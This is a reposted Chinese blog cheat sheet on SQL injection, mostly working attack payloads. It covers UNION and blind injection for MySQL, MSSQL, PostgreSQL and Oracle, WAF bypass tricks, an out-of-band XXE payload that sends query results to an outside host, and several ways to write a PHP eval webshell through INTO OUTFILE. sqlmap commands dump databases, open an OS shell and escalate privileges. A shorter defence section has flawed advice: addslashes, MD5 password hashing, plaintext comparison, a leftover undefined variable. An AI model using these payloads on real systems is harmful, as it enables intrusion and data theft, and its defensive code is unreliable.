# 转载
：  SQL注入总结

# SQL注入总结

 

**目录**

[常规注入：](#h3-1)

[常见的绕过：](#h3-2)

[绕过单引号双引号：](#%E7%BB%95%E8%BF%87%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%9A)

[有回显的注入，数据库类型快速确定：](#h3-3)

[Microsoft：](#Microsoft%EF%BC%9A)

[PostgreSQL：](#PostgreSQL%EF%BC%9A)

[MySQL：](#MySQL%EF%BC%9A)

[Oracle 数据库比较特殊，没有报错函数，但是有明显的dual特征:](#Oracle%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%AF%94%E8%BE%83%E7%89%B9%E6%AE%8A%EF%BC%8C%E6%B2%A1%E6%9C%89%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0%EF%BC%8C%E4%BD%86%E6%98%AF%E6%9C%89%E6%98%8E%E6%98%BE%E7%9A%84dual%E7%89%B9%E5%BE%81%3A)

[无回显的注入（盲注），数据库类型快速确定：](#h3-4)

[Oracle：](#Oracle%EF%BC%9A)

[Microsoft：](#Microsoft%EF%BC%9A)

[PostgreSQL：](#PostgreSQL%EF%BC%9A)

[MySQL：](#MySQL%EF%BC%9A)

[如果都不可以，则尝试XXE配合进行外带注入：](#h3-5)

[sql文件写入：](#h3-6)

[1. 前提：](#1.%20%E5%89%8D%E6%8F%90%EF%BC%9A)

[2. 文件写入：](#2.%20%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%EF%BC%9A)

[防御手段：](#h3-7)

[修复举例：](#%E4%BF%AE%E5%A4%8D%E4%B8%BE%E4%BE%8B%EF%BC%9A)

[一. 面向过程连接数据库时：](#%E4%B8%80.%20%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%97%B6%EF%BC%9A)

[二. 面向过程连接数据库](#%E4%BA%8C.%20%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93)

[SQLmap使用：](#h3-8)

[免费领取安全学习资料包！](#%E5%85%8D%E8%B4%B9%E9%A2%86%E5%8F%96%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E5%8C%85%EF%BC%81%EF%BC%88%E7%A7%81%E8%81%8A%E8%BF%9B%E7%BE%A4%E4%B8%80%E8%B5%B7%E5%AD%A6%E4%B9%A0%EF%BC%8C%E5%85%B1%E5%90%8C%E8%BF%9B%E6%AD%A5%EF%BC%89%E2%80%8B%E7%BC%96%E8%BE%91)

---


#### 常规注入：
1.  `union select '1','2','3'`加上单引号，输出一个字符。而不是直接`union select 1,2,3` 1.  举例： 
```
http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1 union select 1,(select group_concat(distinct(table_schema)) from information_schema.tables),3		//查数据库名一般在information_schema数据库下的tables表里找table_schema字段。其中distinct()是去重，group_concat()是将多个结果连接起来当做一个字符串。


http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1 union select 1,(select group_concat(table_name) from information_schema.tables),3		//查表名一般在information_schema数据库下的tables表里找table_name字段。


http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='error'),3		//查字段名在information_schema数据库下的colums表里找cloumn_name字段。


1. 可以将查询换成user(),version()等查看数据库信息。

```
1.  `union select '1',username||'~'||password FROM users`当只有一个地方能回显时，用`~`连接前后的字段名。<br/> 效果： 1.  `UNION SELECT table_name NULL FROM information_schema.tables -- a `直接在本网页使用的数据库下查找所有的表。用了`group_concat(table_name)`反而不行。 1.  `union查询`前面必须为**假**，才会显示后面的查询结果。<br/> 如：`id=-1' union select '1' -- a` 1.  用`and substr(password,1,1)='a' -- a`去爆破的时候，最后是字符`'a'`，而不能是`a` 
所有的子查询都是要用()括起来。SELECT @@version这种也是子查询。

要么用||连接语句，要么用union连接。注意union连接时，前面的条件需要为假，并且字段数要相同

如：

```
TrackingId=1'||(SELECT version())
TrackingId=-1' union SELECT '1','2',(SELECT @@version)

```

#### 常见的绕过：

##### 绕过单引号双引号：

```
1，关键字可以用%（只限IIS系列）。比如select，可以sel%e%ct 

2，通杀的，内联注释，如/*!select*/

3，编码，可两次编码

4，multipart请求绕过，在POST请求中添加一个上传文件，绕过了绝大多数WAF

5，参数绕过，复制参数，id=1&amp;id=1

6，组合法如and可以用&amp;&amp;再URL编码

7、替换法，如and改成&amp;&amp;;=可以用like或in等

```

#### 有回显的注入，数据库类型快速确定：

不同数据库报错函数：

##### Microsoft：

```
SELECT 'foo' WHERE 1 = (SELECT @@version)

```

##### PostgreSQL：

```
and 1=CAST((SELECT version()) AS int)

```

##### MySQL：

```
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT @@version)))

```

mysql常用报错注入函数：
1.  除了Oracle数据库之外，其他数据库都是通过查询`information_schema.tables`列出数据库中的表： 
```
SELECT * FROM information_schema.tables

```

查询`information_schema.columns`列出各个表中的列：

```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

```

##### **Oracle 数据库比较特殊，没有报错函数，但是有明显的dual特征:**

```
SELECT '' FROM dual

```
1.  Oracle数据库查询的每一步都必须指定表名。而Oracle有一个内置表：`dual`，如果没有表名就用此表名代替。<br/> 如：`UNION SELECT '1'，'2' FROM dual`才能查看注入点。而不是`union select '1','2'`。 1.  在 Oracle 上，您可以通过略有不同的查询来获取相同的信息。<br/> 您可以通过查询列出表`all_tables`: 
```
SELECT * FROM all_tables

```

您可以通过查询列出列`all_tab_columns`:

```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'

```

如：

`union select table_name,'2' from all_tables -- a`， Oracle查询表名。从`all_tables`里查。

`union select column_name,'2' from all_tab_columns where table_name='USERS_JBZQCR' -- a`， 在`all_tab_columns`找字段名。

可以将里面的查询语句**换为数据库版本判断的语句**。进而快速准确的**得知是什么类型的数据库**。

如：

```
SELECT 'foo' WHERE 1 = (SELECT @@version)

```
1.  数据库版本判断： 
```
Oracle:		SELECT banner FROM v$version
			SELECT version FROM v$instance
Microsoft:	SELECT @@version
PostgreSQL:	SELECT version()
MySQL:		SELECT @@version

```

#### 无回显的注入（盲注），数据库类型快速确定：

延时盲注一般是新开一个语句，因此前面要用`;`分开。如果是在Cookie中这种本身就有`;`的地方。就**需要进行url编码**为`%3B`，防止服务器错误处理。

不同数据库的延时函数：

##### Oracle：

条件错误，看页面返回状态码盲注：

```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE '' END FROM dual
如：
SELECT CASE WHEN (length(table_name)&gt;0) THEN TO_CHAR(1/0) ELSE '' END FROM all_tables WHERE ROWNUM = 1		//WHERE ROWNUM = 1是取第一行，取第2行则使用WHERE rownum = 2
查询逻辑等同于其他数据库的：
select table_name from all_tables limit 1

```

延时盲注：

```
';SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual

```

##### Microsoft：

条件错误，看页面返回状态码盲注：

```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END

```

延时盲注：

```
';IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'

```

##### PostgreSQL：

条件错误，看页面返回状态码盲注：

```
1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)

```

延时盲注：

```
';SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
如：
';SELECT CASE WHEN (length(username)&gt;0) THEN pg_sleep(10) ELSE pg_sleep(0) END from users limit 1
逻辑上相当于：
select username from users limit 1

```

##### MySQL：

条件错误，看页面返回状态码盲注：

```
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')

```

延时盲注：

```
';SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')

```

#### 如果都不可以，则尝试XXE配合进行外带注入：

```
SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual

```

#### sql文件写入：

##### 1. 前提：

```
show global variables like '%secure%';		//可以查看是否有读取权限，可以修改其的值进行防止文件读取

```

##### 2. 文件写入：

```
select 1,"&lt;?php @eval($_POST('a'));?&gt;",3 into outfile "/opt/lamp/temp";	//将一句话木马写入到目标服务器文件中。

```

条件：

1、知道web绝对路径

2、有文件写入权限(一般情况只有ROOT用户有)

3、数据库开启了secure_file_priv设置，然后就能用select into outfile写入webshell

常见手法：

联合注入写入：

```
?id=1' union select 1,"&lt;?php @eval($_POST['shell']);?&gt;",3 into outfile 'C:\\phpstudy\\WWW\\sqli\\shell.php'#

```

dumpfile函数写入：

```
?id=1' union select 1,"&lt;?php @eval($_POST['shell']);?&gt;",3 into dumpfile 'C:\\phpstudy\\WWW\\sqli\\shell.php'#

```

lines terminated by 写入：

```
?id=1 into outfile 'C:/wamp64/www/shell.php' lines terminated by '&lt;?php phpinfo()?&gt;';
//lines terminated by 可以理解为 以每行终止的位置添加 xx 内容。

```

lines starting by 写入：

```
?id=1 into outfile 'C:/wamp64/www/shell.php' lines starting by '&lt;?php phpinfo()?&gt;';
//利用 lines starting by 语句拼接webshell的内容。lines starting by 可以理解为 以每行开始的位置添加 xx 内容。

```

fields terminated by 写入：

```
?id=1 into outfile 'C:/wamp64/www/work/shell.php' fields terminated by '&lt;?php phpinfo() ?&gt;';
//利用 fields terminated by 语句拼接webshell的内容。fields terminated by 可以理解为 以每个字段的位置添加 xx 内容。

```

columns terminated by 写入：

```
?id=1 into outfile 'C:/wamp64/www/shell.php' COLUMNS terminated by '&lt;?php phpinfo() ?&gt;';
//利用 fields terminated by 语句拼接webshell的内容。fields terminated by 可以理解为 以每个字段的位置添加 xx 内容。

```

sqlmap写入：

```
写：(要写的文件，必须在kali本机里有)写入到 /tmp 目录下  sqlmap -u "http://127.0.0.1/index.php?page=user-info.php&amp;username=a%27f%27v&amp;password=afv&amp;user-info-php-submit-button=View+Account+Details" -p 'username'  --file-write="shell.php"  --file-dest="/tmp/shell.php"

```

#### 防御手段：

1.预编译（数据库不会将参数的内容视为SQL命令执行，而是作为一个字段的属性值来处理）

2.PDO预处理 (本地和Mysql服务端使用字符集对输入进行转义)

1.关闭应用的错误提示

2.加waf

3.对输入进行过滤，限制输入长度

5.限制好数据库权限，drop/create/truncate等权限谨慎grant

6.预编译好sql语句，python和Php中一般使用?作为占位符。这种方法是从编程框架方面解

决利用占位符参数的sql注入，只能说一定程度上防止注入。还有缓存溢出、终止字符等。

7.数据库信息加密安全（引导到密码学方面）。不采用md5因为有彩虹表，一般是一次md5后

加盐再md5

##### 修复举例：

###### 一. 面向过程连接数据库时：

1.解决**任意访问授权**问题：

```
1.在公共文件中如： common.php 启用 session_start();让其他页面引用。开启session认证功能。

2.在  登录成功的页面  里添加：
    include "common.php";
	if(!isset($_SESSION['islogin'])  or $_SESSION['islogin'] != 'true'){	//进行login的状态查询，如果为空，或者不为true。则阻值访问。
    die('你还没有登录');
}

3.在login.php中，登录成功后添加：
    if (mysqli_num_rows($result) == 1) {	//如果查询到用户，则认为通过，开始设置session。
        $_SESSION['islogin'] = 'true';
        $user = mysqli_fetch_assoc($result);
        $_SESSION['username'] = $user['username'];
    }

```
1.  解决sql语法冲突时，**暴露敏感文件路径**问题： 
```
$result = mysqli_query($conn, $sql) or die('sql语法错误。'); //此时如果sql语句有问题，则直接终止代码。

```
1.  用户**密码明文显示**在数据库中的问题： 
```
//插入时，先将密码MD5加密
//user表中的密码格式必须为32+的长度，便于md5形式保存

```
1.  登录时的**逻辑问题** 
```
sql语句中不要同时传输用户名密码，先传用户名，等查询到有这个用户名信息之后再进行密码核对：
$sql = "select * from user where username='$username'";		//先查询用户名是否存在，即使用户名存在sql注入，也不会登陆成功
$result = mysqli_query($conn, $sql) or die('sql语法错误。');

if (mysqli_num_rows($result) == 1) {			//存在之后在核对密码
    $row = mysqli_fetch_assoc($result);
    if ($row['password'] == $password){
        echo "login-pass";
        $_SESSION['islogin'] = 'true';
        $user = mysqli_fetch_assoc($result);
        $_SESSION['username'] = $user['username'];
        echo "&lt;script&gt;location.href='welcome.php'&lt;/script&gt;";
    }
    else{
        echo "login-fail";
    }
}
else {
    echo "login-fail";
}

```
<li> 使用 **addslashes**函数对用户名和密码进行反斜杠转义为普通字符 <pre><code>$username = addslashes($_POST['username']);
</code></pre> </li>
$password = addslashes($_POST['password']);<br/> ```

###### 二. 面向过程连接数据库
1.  面向过程连接数据库时，以上解决**任意访问授权**问题，解决sql语法冲突时，**暴露敏感文件路径**问题，用户**密码明文显示**在数据库中的问题也都可以继续使用。 
```
$conn = connection_oop();		//此connection_oop应该是定义好的面向对象连接数据库的函数。

$sql = "select username,password from user where username=?";	//  ？代表占位符，与bind_param里的变量绑定。
$stmt = $conn-&gt;prepare($sql);		//实例化一个预处理对象$stmt， prepare是mysqli预处理库里的预处理函数。执行sql语句。
$stmt-&gt;bind_param("s",$username);	//与前面sql语句里的?进行绑定，将接收到的传参传给?。s表示字符串，i表示整数，d表示小数，b表示二进制。如果是多个传参，如一个字符串一个整数，则为"is"与后面的参数一一对应。
$stmt-&gt;bind_result($stmt_username,$stmt_password);	//绑定预处理的输出的结果，这里的参数可以自定义名称，这里是上面sql语句的执行结果。
$stmt-&gt;execute();	//预处理的执行语句
$stmt-&gt;store_result();	//预处理将结果存起来，用于fetch(),num_rows()什么的。



if ($stmt-&gt;num_rows == 1) {		//预处理查询用户输入的用户名，看看是否存在。
    $stmt-&gt;fetch();
    if ($password == $stmt_password){		//将用户输入的与预处理查到的进行比对。
        echo "login-pass";
        $_SESSION['islogin'] = 'true';
        $user = mysqli_fetch_assoc($result);
        $_SESSION['username'] = $user['username'];
        echo "&lt;script&gt;location.href='welcome.php'&lt;/script&gt;";
    }
    else{
        echo "login-fail";

    }
}
else {
    echo "login-fail";
}

```

#### SQLmap使用：

身份验证的地方要带上cookie！！！！！！ --cookie

```
1. 进行注入测试：
sqlmap -u "http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1" --level=2 	//level等级从1到5

2. 获取所有数据库名：
sqlmap -u "http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1" --dbs

3. 获取当前使用的数据库名：
sqlmap -u "http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1" --current-db

4. 指定数据库名，--tables获取此数据库下的所有表名：
sqlmap -u "http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1" -D "error" --tables

5. 指定数据库和表，--columns获取此表下的列名：
sqlmap -u "http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1" -D "error" -T "error_flag" --columns

6. 知道数据库，表，列名，可以直接dump拖库：
sqlmap -u "http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1" -D "error" -T "error_flag" -C "flag,id" --dump

7. --is-dba查看当前用户是否是DBA（Database Administrator）数据库管理员：
sqlmap -u "http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1" --dbms=mysql --is-dba  	//--dbms=mysql指定数据库为mysql了，就不会再去猜数据库类型。

8. --batch能让sqlmap自动化进行。（中途需要选择时，不需要我们手动选择，他会选择默认选项。）

如果是post传参的话，需要抓包保存成txt。然后将txt上传到kali有写入文件权限的文件夹里，让sqlmap去读取，并且用-p来指定post传参。
 sqlmap -r ./111.txt -p adname
 
 --delay=1  	//延时一秒

--random-agent"参数来启用一个随机User-Agent

--os-cmd,--os-shell都可以执行系统命令。
--os-cmd可以单次执行系统命令，进行返回结果。如：--os-cmd='whoami'
--os-shell可以尝试直接获取一个交互式的shell。
--file-write="shell.php"  --file-dest="/tmp/shell.php"		第一个是shell文件，第二个是shell上传位置。
--is-dba查看是否是管理员权限。
--priv-esc	权限提升
```

## **免费领取安全学习资料包！（私聊进群一起学习，共同进步）**<img alt="" height="768" src="https://img-blog.csdnimg.cn/7d1de7d31b974fb19bc1ea094328c4ed.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/df5aa1c41a05420db6581cd2df8da2cf.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/dbab9babfcb94c21a9a89d0519f29256.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/8709e71686ab41a6b6c926fbf1120ff5.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/4ecd611637574fc4b77dcefc0256e2b7.png" width="665"/>

应急响应笔记

学习路线

```
原文链接：https://www.freebuf.com/articles/network/381269.html
```

 
